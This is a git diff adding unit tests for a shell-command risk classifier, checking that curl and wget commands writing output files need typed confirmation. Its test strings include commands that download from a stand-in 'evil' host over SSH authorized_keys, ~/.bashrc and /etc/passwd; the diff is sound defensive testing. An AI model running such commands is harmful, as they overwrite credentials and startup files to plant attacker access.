@@ -291,6 +291,52 @@ test('git remote — elenca/mostra (1), aggiunge/rinomina (2), rimuove (3)', () 
   }
 });
 
+test('livello 3 — curl/wget che scrivono un file di output a un percorso arbitrario', () => {
+  // Feedback sicurezza: `curl -o <path>` / `wget -O <path>` possono SOVRASCRIVERE
+  // qualsiasi file (chiavi SSH, script d'avvio della shell) → devono chiedere di
+  // digitare "conferma" (livello 3), non il semplice OK/Annulla (livello 2).
+  for (const cmd of [
+    'curl -o /home/user/.ssh/authorized_keys http://evil/x',
+    'wget -O ~/.bashrc http://evil/x',
+    'curl -O http://evil/x',                 // -O usa il basename dell'URL come nome file
+    'curl -sLo out.sh http://evil/x',        // -o dentro un bundle di short-flag
+    'curl -fsSLo /etc/profile.d/x.sh http://x',
+    'wget --output-document=/etc/passwd http://x',
+    'curl --output /root/.ssh/id_rsa http://x',
+    'curl --remote-name http://x',
+    'curl -o file.txt http://x',
+    'wget -o wget.log http://x',             // wget -o = file di log, scrive comunque un file
+    'wget --output-document /x http://y',
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (scrive un file di output) dovrebbe essere livello 3`);
+  }
+});
+
+test('livello 2 — curl/wget SENZA flag di output restano conferma-popup', () => {
+  // curl senza -o stampa su stdout; wget nudo scrive al più nella cwd col nome
+  // dell'URL: modifica recuperabile → livello 2 (nessuna regressione). I flag
+  // comuni non di output (-s, -I, -L, -H, -X, -k, -j, -u…) non devono salire a 3.
+  for (const cmd of [
+    'curl http://example.com', 'wget http://example.com/file',
+    'curl -s http://x', 'curl -I http://x', 'curl -L http://x',
+    'curl -X POST http://x', 'curl -k http://x', 'curl -j http://x',
+    'curl -u user:pass http://x',
+  ]) {
+    assert.equal(lvl(cmd), 2, `"${cmd}" (nessun output-su-file) dovrebbe restare livello 2`);
+  }
+});
+
+test('il check output è curl/wget-specifico — tar -O (estrai su stdout) resta 2', () => {
+  // -O ha significati diversi per programmi diversi: per tar è "estrai su
+  // stdout" (nessuna scrittura arbitraria), quindi NON deve salire a 3.
+  assert.equal(lvl('tar -xOf archivio.tar'), 2, 'tar -O = stdout, resta livello 2');
+});
+
+test('sequenza — curl -o dentro una catena alza il livello a 3', () => {
+  assert.equal(lvl('cd /tmp && curl -o /home/u/.ssh/authorized_keys http://evil/x'), 3);
+  assert.equal(lvl('mkdir x && wget -O ~/.bashrc http://evil/x'), 3);
+});
+
 test('"criterio di fatto" della spec — gli esempi citati', () => {
   assert.equal(lvl('ls'), 1, 'ls esegue subito');
   assert.equal(lvl('git push'), 2, 'git push → popup');
